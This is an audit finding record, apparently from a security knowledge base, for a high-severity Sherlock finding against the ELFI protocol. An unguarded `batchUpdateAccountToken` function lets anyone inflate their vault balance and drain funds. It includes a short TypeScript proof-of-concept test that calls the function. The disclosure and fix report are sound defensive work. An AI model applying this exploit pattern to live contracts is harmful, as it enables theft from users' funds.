---
tags:
  - lang/solidity
  - sector/perpetuals
  - sector/stable
  - platform/sherlock
  - has/github
  - severity/high
  - vuln/access-control/missing-modifier
  - fix/add-access-control
  - novelty/variant
  - misassumption/admin-is-honest
protocol: "[[Elfi]]"
auditors:
  - "[[volodya]]"
report: "https://github.com/sherlock-audit/2024-05-elfi-protocol-judging"
genome:
  - "[[missing-modifier]]"
  - "[[add-access-control]]"
  - "[[variant]]"
  - "[[direct-drain]]"
  - "[[access-roles]]"
---
# H-2: Anyone can change the balance of an account to drain the entire portfolio vault

- id: 34764
- impact: HIGH
- protocol: [[Elfi]]
- reporter: volodya (Sherlock)
- source: N/A

## Summary


The report describes a bug in the ELFI Protocol where anyone can change the balance of an account in the portfolio vault without actually depositing any tokens. This can lead to all the funds in the portfolio vault being drained. The vulnerability was found by a group of individuals and can be exploited by calling the function `batchUpdateAccountToken` with desired amounts and then withdrawing the funds from the portfolio vault. The code snippet for this function is provided in the report. The bug was discovered through manual review and the recommendation is to remove the function or add proper access control and token transfer mechanisms. The issue has been fixed by the protocol team in a recent PR. 

## Details

Source: https://github.com/sherlock-audit/2024-05-elfi-protocol-judging/issues/28 

## Found by 
0xPwnd, 0xrex, 1337, KingNFT, KrisRenZo, KupiaSec, PNS, Timenov, blackhole, debugging3, jah, jennifer37, joicygiore, link, mstpr-brainbot, pashap9990, qpzm, r0bert, tedox, volodya, whitehair0330
## Summary
Anyone can call `batchUpdateAccountToken` to update their balance in portfolio vault without depositing the tokens. 
## Vulnerability Detail
Simply call the function with desired amounts and withdraw the funds from portfolio vault

**Coded PoC:**
```typescript
it("Anyone Can change the balance as wish", async function () {
		const usdcAmount = precision.token(1000, 6);
		// do this so that the user0 account is exists
		await deposit(fixture, {
			account: user0,
			token: usdc,
			amount: usdcAmount,
		});

		// change the balance as you wish
		const updateAccParams = {
			account: user0.address,
			tokens: [usdcAddr, wbtcAddr],
			changedTokenAmounts: [
				precision.token(100_000, 6), // USDC with 6 decimals
				precision.token(100), // WBTC with default 18 decimals
			],
		};

		await accountFacet.connect(user0).batchUpdateAccountToken(updateAccParams);

		const accountInfo = await accountFacet.getAccountInfo(user0.address);
		console.log(
			"Account info before execute and after create request",
			accountInfo
		);
	});
```
## Impact
All funds in portfolio vault can be drained. 
## Code Snippet
https://github.com/sherlock-audit/2024-05-elfi-protocol/blob/8a1a01804a7de7f73a04d794bf6b8104528681ad/elfi-perp-contracts/contracts/facets/AccountFacet.sol#L68-L71
## Tool used

Manual Review

## Recommendation
I am guessing this function should not be existed and here for test purposes, missing access control or missing the actual token transfer. Without knowing the exact reason why this function is here it is not possible to give any recommendations. 



## Discussion

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/0xCedar/elfi-perp-contracts/pull/11
